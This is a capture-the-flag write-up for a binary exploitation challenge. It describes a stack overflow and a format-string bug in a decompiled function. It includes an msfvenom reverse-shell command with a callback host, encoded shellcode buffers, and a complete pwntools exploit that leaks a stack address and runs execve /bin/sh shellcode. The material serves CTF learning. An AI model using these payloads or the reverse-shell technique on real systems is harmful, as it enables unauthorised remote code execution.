@@ -1,0 +1,149 @@
+PWN ALL challenge
+
+We're using my Kali vm plus some Ghidra for the reversing (we could use cutter as well, but hey)
+
+The main just calls the vuln function
+The vuln function just uses the read() function but with a buffer of 256 bytes while the variable that is is reading into is only capable of storing 32 bytes
+
+
+void vuln(void)
+
+{
+  int iVar1;
+  char local_28 [32];
+  
+  while( true ) {
+    iVar1 = strcmp(local_28,"quit");
+    if (iVar1 == 0) break;
+    read(0,local_28,0x100);
+    printf(local_28);
+  }
+  return;
+}
+
+
+Let's get the payload 
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=24000 -f py -e x86/shikata_ga_nai -b '\x00\x0a' -i 2 -s 224
+
+And the python script to execute it (I'm reusing one from previous CTFs)
+
+This is still for testing and the quit message works this time 
+GNU nano 7.2                                                           Exploitall.py                                                                     
+from pwn import *
+
+io = remote('all.chal.cyberjousting.com', 1348)
+
+
+io.sendline(b'A' * 20 + b'quit' * 0)
+
+print(io.recvall())
+
+io.send(b'quit')
+
+print(io.recvall())
+
+------------------------
+Lets try this one
+
+
+from pwn import *
+
+io = remote('all.chal.cyberjousting.com', 1348)
+
+buf =  b""
+buf += b"\xda\xcf\xbd\x41\x12\x71\x92\xd9\x74\x24\xf4\x5a"
+buf += b"\x31\xc9\xb1\x18\x31\x6a\x1a\x03\x6a\x1a\x83\xc2"
+buf += b"\x04\xe2\xb4\xaf\x81\x8d\x61\x2e\xbc\x76\x54\xba"
+buf += b"\x1b\x83\x3c\x68\xad\xda\xd2\x5f\x47\x0f\x51\x5d"
+buf += b"\x93\x2c\xcf\x73\x29\x39\x84\x86\x9f\x29\x82\x23"
+buf += b"\x42\xe4\xee\x71\xe7\xfa\x88\x62\x0d\x9a\x8b\x81"
+buf += b"\x14\x10\xac\xbf\xf9\x0a\xa5\x28\x9a\x1a\xc1\x98"
+buf += b"\x38\xeb\x1a\xe9\x68\x5a\xdf\x5f\x15\xc2\x2f\x1a"
+buf += b"\x95\x09\xd8\x01\x95\x57\x59\x90\x46\x45\xf2\x6d"
+buf += b"\x86\x6b\x39\x96\x6e\x70\x9a\xf2\xee\x75\xf7\x45"
+buf += b"\x4e\x3c"
+
+io.send(b'quit' + b'\x00' * 28 + buf)
+
+print(io.recvall())
+
+So this doesn't work, which is cool and all, but that is because we didnt account for the base pointer (rookie mistake)
+
+from pwn import *
+
+io = remote('all.chal.cyberjousting.com', 1348)
+
+buf =  b""
+buf += b"\xda\xcf\xbd\x41\x12\x71\x92\xd9\x74\x24\xf4\x5a"
+buf += b"\x31\xc9\xb1\x18\x31\x6a\x1a\x03\x6a\x1a\x83\xc2"
+buf += b"\x04\xe2\xb4\xaf\x81\x8d\x61\x2e\xbc\x76\x54\xba"
+buf += b"\x1b\x83\x3c\x68\xad\xda\xd2\x5f\x47\x0f\x51\x5d"
+buf += b"\x93\x2c\xcf\x73\x29\x39\x84\x86\x9f\x29\x82\x23"
+buf += b"\x42\xe4\xee\x71\xe7\xfa\x88\x62\x0d\x9a\x8b\x81"
+buf += b"\x14\x10\xac\xbf\xf9\x0a\xa5\x28\x9a\x1a\xc1\x98"
+buf += b"\x38\xeb\x1a\xe9\x68\x5a\xdf\x5f\x15\xc2\x2f\x1a"
+buf += b"\x95\x09\xd8\x01\x95\x57\x59\x90\x46\x45\xf2\x6d"
+buf += b"\x86\x6b\x39\x96\x6e\x70\x9a\xf2\xee\x75\xf7\x45"
+buf += b"\x4e\x3c"
+
+io.send(b'quit' + b'\x00' * 36 + buf + b'\x90' * 92)
+
+print(io.recvall())
+
+
+
+
+io.send(b'\x90' * 36 + buf + b'\x90' * 98 + b'quit'+ b'\x00')
+
+
+io.send(b'quit' + b'\x20' * 36 + buf + b'\x90' * 92)
+
+ACTUAL SOLVE --------------------------------------------------------
+
+from pwn import *
+
+
+binary = "src/all"
+elf = context.binary = ELF(binary, checksec=False)
+
+gs = """
+break *vuln+78
+continue
+"""
+
+if args.REMOTE:
+    p = remote("localhost", 40000)
+elif args.GDB:
+    context.terminal = ["tmux", "splitw", "-h"]
+    p = gdb.debug(binary, gdbscript=gs)
+else:
+    p = elf.process()
+
+
+### STACK LEAK ###
+p.sendline(b'%p')
+stack = int(p.recvline().strip().decode(),16)
+print("stack: ", hex(stack))
+
+
+### COMPILE SHELLCODE ###
+code = """
+xor   rsi, rsi	                # clear rsi
+xor   rdx, rdx                  # clear rdx
+mov   rdi, rsp                  # stack pointer to /bin/sh
+sub   rdi, 43
+mov   rax, 59                   # sys_execve
+syscall
+"""
+
+shellcode = asm(code)
+
+
+### SEND TO SHELLCODE ###
+payload = b'quit\x00' + b'/bin/sh\x00' + shellcode + b'A' * (35 - len(shellcode) - 8)
+payload += p64(stack + 13)
+
+p.sendline(payload)
+
+p.interactive()
